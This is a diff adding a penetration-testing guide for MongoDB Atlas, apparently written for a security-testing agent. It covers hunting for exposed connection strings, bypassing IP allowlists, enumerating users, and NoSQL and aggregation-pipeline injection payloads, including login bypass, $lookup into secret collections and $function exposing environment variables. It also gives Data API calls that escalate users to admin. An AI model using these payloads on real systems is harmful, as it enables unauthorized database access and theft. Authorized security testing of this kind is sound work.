@@ -1,0 +1,450 @@
+<mongodb_atlas_security_guide>
+<title>MONGODB ATLAS CLOUD SECURITY TESTING</title>
+
+<critical>MongoDB Atlas is a fully-managed cloud database service. Security vulnerabilities arise from connection string exposure, misconfigured IP whitelists, weak authentication, NoSQL injection in aggregation pipelines, and Realm/App Services misconfigurations. Testing must cover both database and platform security.</critical>
+
+<scope>
+- Connection string exposure
+- IP whitelist bypass
+- Database user enumeration
+- Aggregation pipeline injection
+- Realm/App Services security
+- Cluster access controls
+- Data API vulnerabilities
+</scope>
+
+<methodology>
+1. Identify Atlas cluster endpoints and connection methods.
+2. Test for connection string exposure in code/configs.
+3. Probe IP access controls and bypass techniques.
+4. Test authentication mechanisms and user enumeration.
+5. Analyze data access patterns for injection points.
+6. Review Realm/App Services configurations.
+</methodology>
+
+<connection_string_exposure>
+<discovery>
+{% raw %}
+# Finding exposed connection strings:
+
+# Common locations:
+# - Environment variables
+# - Configuration files
+# - Source code repositories
+# - Client-side JavaScript
+# - Mobile app binaries
+# - Docker images
+
+# Connection string format:
+mongodb+srv://<username>:<password>@<cluster>.mongodb.net/<database>
+
+# Search patterns:
+# GitHub/GitLab:
+"mongodb+srv://" filename:.env
+"mongodb.net" password
+
+# In code:
+grep -r "mongodb+srv://" .
+grep -r "mongodb.net" .
+
+# URL encoded passwords:
+mongodb+srv://user:p%40ssw0rd@cluster.mongodb.net/
+
+# Component extraction:
+# Cluster: cluster.xxxxx.mongodb.net
+# Username: embedded in string
+# Password: embedded in string
+# Database: after cluster/
+{% endraw %}
+</discovery>
+
+<connection_testing>
+{% raw %}
+# Testing exposed credentials:
+
+# Using mongosh:
+mongosh "mongodb+srv://user:pass@cluster.mongodb.net/test"
+
+# List databases:
+show dbs
+
+# List collections:
+show collections
+
+# Extract data:
+db.users.find()
+
+# Using Python:
+from pymongo import MongoClient
+client = MongoClient("mongodb+srv://...")
+for db_name in client.list_database_names():
+    print(db_name)
+
+# Check user privileges:
+db.runCommand({connectionStatus: 1, showPrivileges: true})
+{% endraw %}
+</connection_testing>
+</connection_string_exposure>
+
+<ip_whitelist>
+<bypass_techniques>
+{% raw %}
+# IP whitelist bypass:
+
+# 1. Cloud function/serverless bypass:
+# Application uses serverless function
+# Serverless IPs may be whitelisted broadly
+# Invoke function with malicious payload
+
+# 2. SSRF exploitation:
+# If application has SSRF vulnerability
+# Access MongoDB through internal network
+
+# 3. Shared infrastructure:
+# Same cloud provider subnet
+# Co-located services
+
+# 4. 0.0.0.0/0 misconfiguration:
+# Check if all IPs are allowed
+# Common in development/testing
+
+# 5. Peering/VPN access:
+# Through VPC peering
+# VPN tunnel access
+
+# 6. Atlas Data API:
+# May have different access controls
+# API key based rather than IP based
+{% endraw %}
+</bypass_techniques>
+
+<ip_enumeration>
+{% raw %}
+# Testing IP restrictions:
+
+# Direct connection attempt:
+mongosh "mongodb+srv://cluster.mongodb.net" --username test
+
+# Error analysis:
+# "IP address not in whitelist"
+# "Connection refused"
+# "Authentication failed"
+
+# Timing differences:
+# IP blocked vs auth failed timing
+
+# Atlas status page:
+# Check cluster status/health endpoints
+
+# Data API test:
+curl -X POST \
+  https://data.mongodb-api.com/app/{app-id}/endpoint/data/v1/action/find \
+  -H "api-key: {api-key}" \
+  -H "Content-Type: application/json" \
+  -d '{"dataSource": "Cluster", "database": "test", "collection": "users"}'
+{% endraw %}
+</ip_enumeration>
+</ip_whitelist>
+
+<user_enumeration>
+<enumeration_techniques>
+{% raw %}
+# Database user enumeration:
+
+# Authentication error differences:
+# "Authentication failed" - user exists, wrong password
+# "User not found" - user doesn't exist
+
+# Timing analysis:
+# Valid username may take longer to reject
+
+# Common Atlas usernames:
+admin, root, mongodb, atlas, app, api, readonly, backup
+
+# Built-in roles:
+atlasAdmin, readWriteAnyDatabase, readAnyDatabase
+dbAdmin, dbOwner, userAdmin
+
+# Connection attempt with common users:
+mongosh "mongodb+srv://admin:test@cluster.mongodb.net"
+mongosh "mongodb+srv://root:test@cluster.mongodb.net"
+
+# API key enumeration:
+# Different error for invalid vs revoked keys
+{% endraw %}
+</enumeration_techniques>
+</user_enumeration>
+
+<injection_attacks>
+<nosql_injection>
+{% raw %}
+# NoSQL injection in Atlas:
+
+# Query operator injection:
+# Instead of: {"username": "admin"}
+# Inject: {"username": {"$ne": null}}
+
+# Login bypass:
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+
+# Regular expression injection:
+{"username": {"$regex": "^admin"}}
+
+# Where clause injection:
+{"$where": "this.username == 'admin'"}
+
+# Array operators:
+{"$or": [{"username": "admin"}, {"isAdmin": true}]}
+
+# In URL parameters:
+/api/users?username[$ne]=null
+/api/search?query[$regex]=.*
+
+# JSON injection:
+{"field": "value", "$or": [{}]}
+{% endraw %}
+</nosql_injection>
+
+<aggregation_injection>
+{% raw %}
+# Aggregation pipeline injection:
+
+# If user input goes into aggregation:
+# $match injection:
+{"$match": {"status": {"$ne": "deleted"}}}
+# Inject: {"status": {"$exists": true}}
+
+# $lookup for unauthorized joins:
+[
+  {"$lookup": {
+    "from": "secrets",
+    "localField": "_id",
+    "foreignField": "userId",
+    "as": "secrets"
+  }}
+]
+
+# $project for field extraction:
+[{"$project": {"password": 1, "apiKey": 1}}]
+
+# $out to write to arbitrary collection:
+[{"$out": "attacker_collection"}]
+
+# $merge for data manipulation:
+[{"$merge": {"into": "users", "on": "_id", "whenMatched": "replace"}}]
+
+# JavaScript injection in $function:
+[{"$addFields": {"x": {"$function": {
+  "body": "function() { return process.env }",
+  "args": [],
+  "lang": "js"
+}}}}]
+{% endraw %}
+</aggregation_injection>
+</injection_attacks>
+
+<realm_app_services>
+<realm_vulnerabilities>
+{% raw %}
+# MongoDB Realm/App Services security:
+
+# GraphQL endpoint:
+POST https://realm.mongodb.com/api/client/v2.0/app/{app-id}/graphql
+{
+  "query": "{ users { _id email password } }"
+}
+
+# Custom function invocation:
+POST https://realm.mongodb.com/api/client/v2.0/app/{app-id}/functions/call
+{
+  "name": "adminFunction",
+  "arguments": []
+}
+
+# Authentication bypass:
+# Anonymous auth enabled
+# API key with excessive permissions
+# Custom JWT validation bypass
+
+# Sync permissions:
+# Check read/write rules
+# Cross-partition access
+
+# Triggers security:
+# Malicious trigger injection
+# Event manipulation
+{% endraw %}
+</realm_vulnerabilities>
+
+<data_api>
+{% raw %}
+# Atlas Data API testing:
+
+# Find operation:
+POST /endpoint/data/v1/action/find
+{
+  "dataSource": "Cluster",
+  "database": "test",
+  "collection": "users",
+  "filter": {}
+}
+
+# InsertOne:
+POST /endpoint/data/v1/action/insertOne
+{
+  "dataSource": "Cluster",
+  "database": "test",
+  "collection": "users",
+  "document": {"role": "admin"}
+}
+
+# UpdateOne:
+POST /endpoint/data/v1/action/updateOne
+{
+  "dataSource": "Cluster",
+  "database": "test",
+  "collection": "users",
+  "filter": {"_id": {"$oid": "..."}},
+  "update": {"$set": {"isAdmin": true}}
+}
+
+# Aggregate with injection:
+POST /endpoint/data/v1/action/aggregate
+{
+  "dataSource": "Cluster",
+  "database": "test",
+  "collection": "users",
+  "pipeline": [
+    {"$lookup": {"from": "secrets", "as": "data"}}
+  ]
+}
+{% endraw %}
+</data_api>
+</realm_app_services>
+
+<access_control>
+<rbac_testing>
+{% raw %}
+# Role-based access control testing:
+
+# Check current user roles:
+db.runCommand({usersInfo: {user: "currentUser", db: "admin"}})
+
+# Privilege escalation attempts:
+# Create user with higher privileges
+db.createUser({
+  user: "attacker",
+  pwd: "password",
+  roles: ["root"]
+})
+
+# Role enumeration:
+db.getRoles({showPrivileges: true})
+
+# Database enumeration:
+db.adminCommand({listDatabases: 1})
+
+# Collection enumeration:
+db.getCollectionNames()
+
+# Action testing:
+# dropDatabase
+# createCollection
+# createIndex
+# createUser
+{% endraw %}
+</rbac_testing>
+
+<cluster_access>
+{% raw %}
+# Cluster-level access testing:
+
+# Atlas Admin API:
+# Check for exposed API keys
+# Test API key permissions
+
+# Organization access:
+# Enumerate organization members
+# Access other projects
+
+# Backup access:
+# Access to snapshots
+# Point-in-time recovery data
+
+# Monitoring data:
+# Performance metrics
+# Query logs
+# Alert configurations
+
+# Network configuration:
+# Peering connections
+# Private endpoints
+# IP access lists
+{% endraw %}
+</cluster_access>
+</access_control>
+
+<common_payloads>
+{% raw %}
+# Connection string discovery:
+grep -r "mongodb+srv://" .
+
+# NoSQL injection:
+{"username": {"$ne": null}, "password": {"$ne": null}}
+
+# Aggregation injection:
+[{"$lookup": {"from": "secrets", "as": "data"}}]
+
+# Data API:
+POST /endpoint/data/v1/action/find
+{"filter": {}}
+
+# User enumeration:
+mongosh "mongodb+srv://admin:test@cluster.mongodb.net"
+
+# Privilege check:
+db.runCommand({connectionStatus: 1, showPrivileges: true})
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate connection string exposure and access.
+2. Show NoSQL injection bypassing authentication.
+3. Prove aggregation pipeline injection.
+4. Document Data API or Realm misconfiguration.
+5. Provide credential-based access evidence.
+</validation>
+
+<false_positives>
+- Properly restricted IP whitelists
+- Strong authentication with MFA
+- Parameterized queries preventing injection
+- Proper RBAC with least privilege
+- Realm rules enforcing data access
+- Disabled Data API or restricted access
+</false_positives>
+
+<impact>
+- Complete database access via exposed credentials
+- Data exfiltration through injection
+- Authentication bypass
+- Privilege escalation to admin
+- Data manipulation and deletion
+- Cross-tenant data access
+</impact>
+
+<pro_tips>
+1. Search code repositories for connection strings.
+2. Test both direct MongoDB and Data API access.
+3. Check Realm/App Services GraphQL endpoint.
+4. Test aggregation pipelines for injection.
+5. Enumerate database users through error messages.
+6. Check for 0.0.0.0/0 IP whitelist.
+7. Test SSRF paths to internal MongoDB access.
+8. Verify role-based access control enforcement.
+9. Check for anonymous authentication in Realm.
+10. Document cluster ID and project details.
+</pro_tips>
+
+<remember>MongoDB Atlas security spans multiple layers: connection security, authentication, authorization, and application-level access. A single exposed connection string or misconfigured IP whitelist can compromise the entire database. Always test all access methods including direct connection, Data API, and Realm services.</remember>
+</mongodb_atlas_security_guide>
